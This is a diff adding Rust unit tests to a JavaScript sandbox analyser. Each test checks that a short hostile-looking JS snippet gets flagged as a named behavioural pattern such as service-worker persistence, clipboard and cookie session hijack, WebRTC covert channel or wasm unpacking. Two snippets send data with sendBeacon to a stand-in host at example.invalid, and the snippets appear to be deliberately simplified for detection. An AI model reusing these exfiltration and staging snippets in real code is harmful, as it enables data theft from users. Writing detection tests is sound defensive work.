@@ -1384,6 +1384,219 @@ fn sandbox_handles_get_annot() {
     }
 }
 
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_flags_service_worker_persistence_abuse() {
+    let options = DynamicOptions::default();
+    let payload = br#"
+        navigator.serviceWorker.register('/sw.js');
+        navigator.serviceWorker.getRegistrations();
+        caches.open('v1');
+    "#;
+    let outcome = js_analysis::run_sandbox(payload, &options);
+    match outcome {
+        DynamicOutcome::Executed(signals) => {
+            assert!(signals
+                .behavioral_patterns
+                .iter()
+                .any(|pattern| pattern.name == "service_worker_persistence_abuse"));
+        }
+        _ => panic!("expected executed"),
+    }
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_flags_webcrypto_key_staging_exfil() {
+    let options = DynamicOptions::default();
+    let payload = br#"
+        crypto.subtle.generateKey('AES');
+        crypto.subtle.exportKey('raw');
+        navigator.sendBeacon('https://example.invalid/exfil', 'blob');
+    "#;
+    let outcome = js_analysis::run_sandbox(payload, &options);
+    match outcome {
+        DynamicOutcome::Executed(signals) => {
+            assert!(signals
+                .behavioral_patterns
+                .iter()
+                .any(|pattern| pattern.name == "webcrypto_key_staging_exfil"));
+        }
+        _ => panic!("expected executed"),
+    }
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_flags_storage_backed_payload_staging() {
+    let options = DynamicOptions::default();
+    let payload = br#"
+        localStorage.setItem('staged', "app.alert('x')");
+        var staged = localStorage.getItem('staged');
+        eval(staged);
+    "#;
+    let outcome = js_analysis::run_sandbox(payload, &options);
+    match outcome {
+        DynamicOutcome::Executed(signals) => {
+            assert!(signals
+                .behavioral_patterns
+                .iter()
+                .any(|pattern| pattern.name == "storage_backed_payload_staging"));
+        }
+        _ => panic!("expected executed"),
+    }
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_flags_dynamic_module_graph_evasion() {
+    let options = DynamicOptions::default();
+    let payload = br#"
+        var fs = require('fs');
+        var path = require('path');
+        path.join('a', 'b');
+        eval('1');
+    "#;
+    let outcome = js_analysis::run_sandbox(payload, &options);
+    match outcome {
+        DynamicOutcome::Executed(signals) => {
+            assert!(signals
+                .behavioral_patterns
+                .iter()
+                .any(|pattern| pattern.name == "dynamic_module_graph_evasion"));
+        }
+        _ => panic!("expected executed"),
+    }
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_flags_covert_realtime_channel_abuse() {
+    let options = DynamicOptions::default();
+    let payload = br#"
+        RTCPeerConnection.createDataChannel('c2');
+        var msg = String.fromCharCode(115,116,97,103,101);
+        RTCDataChannel.send(msg);
+    "#;
+    let outcome = js_analysis::run_sandbox(payload, &options);
+    match outcome {
+        DynamicOutcome::Executed(signals) => {
+            assert!(signals
+                .behavioral_patterns
+                .iter()
+                .any(|pattern| pattern.name == "covert_realtime_channel_abuse"));
+        }
+        _ => panic!("expected executed"),
+    }
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_flags_clipboard_session_hijack_behaviour() {
+    let options = DynamicOptions::default();
+    let payload = br#"
+        navigator.clipboard.readText();
+        document.cookie();
+        navigator.sendBeacon('https://example.invalid', 'token');
+    "#;
+    let outcome = js_analysis::run_sandbox(payload, &options);
+    match outcome {
+        DynamicOutcome::Executed(signals) => {
+            assert!(signals
+                .behavioral_patterns
+                .iter()
+                .any(|pattern| pattern.name == "clipboard_session_hijack_behaviour"));
+        }
+        _ => panic!("expected executed"),
+    }
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_flags_dom_sink_policy_bypass_attempt() {
+    let options = DynamicOptions::default();
+    let payload = br#"
+        trustedTypes.createPolicy('safe', {});
+        document.setInnerHTML('<img src=x onerror=1>');
+        eval('1');
+    "#;
+    let outcome = js_analysis::run_sandbox(payload, &options);
+    match outcome {
+        DynamicOutcome::Executed(signals) => {
+            assert!(signals
+                .behavioral_patterns
+                .iter()
+                .any(|pattern| pattern.name == "dom_sink_policy_bypass_attempt"));
+        }
+        _ => panic!("expected executed"),
+    }
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_flags_wasm_memory_unpacker_pipeline() {
+    let options = DynamicOptions::default();
+    let payload = br#"
+        WebAssembly.instantiate('mod');
+        WebAssembly.Memory({initial:1});
+        Buffer.from('4141', 'hex');
+        eval('1');
+    "#;
+    let outcome = js_analysis::run_sandbox(payload, &options);
+    match outcome {
+        DynamicOutcome::Executed(signals) => {
+            assert!(signals
+                .behavioral_patterns
+                .iter()
+                .any(|pattern| pattern.name == "wasm_memory_unpacker_pipeline"));
+        }
+        _ => panic!("expected executed"),
+    }
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_flags_extension_api_abuse_probe() {
+    let options = DynamicOptions::default();
+    let payload = br#"
+        chrome.runtime.sendMessage('hello');
+        chrome.storage.local.get('key');
+    "#;
+    let outcome = js_analysis::run_sandbox(payload, &options);
+    match outcome {
+        DynamicOutcome::Executed(signals) => {
+            assert!(signals
+                .behavioral_patterns
+                .iter()
+                .any(|pattern| pattern.name == "extension_api_abuse_probe"));
+        }
+        _ => panic!("expected executed"),
+    }
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_flags_modern_fingerprint_evasion() {
+    let options = DynamicOptions::default();
+    let payload = br#"
+        navigator.userAgentData.getHighEntropyValues(['platform']);
+        permissions.query({name: 'notifications'});
+        WebGLRenderingContext.getParameter(37445);
+        AudioContext.createAnalyser();
+        setTimeout(function () {}, 1);
+    "#;
+    let outcome = js_analysis::run_sandbox(payload, &options);
+    match outcome {
+        DynamicOutcome::Executed(signals) => {
+            assert!(signals
+                .behavioral_patterns
+                .iter()
+                .any(|pattern| pattern.name == "modern_fingerprint_evasion"));
+        }
+        _ => panic!("expected executed"),
+    }
+}
+
 #[cfg(not(feature = "js-sandbox"))]
 #[test]
 fn sandbox_reports_unavailable_without_feature() {
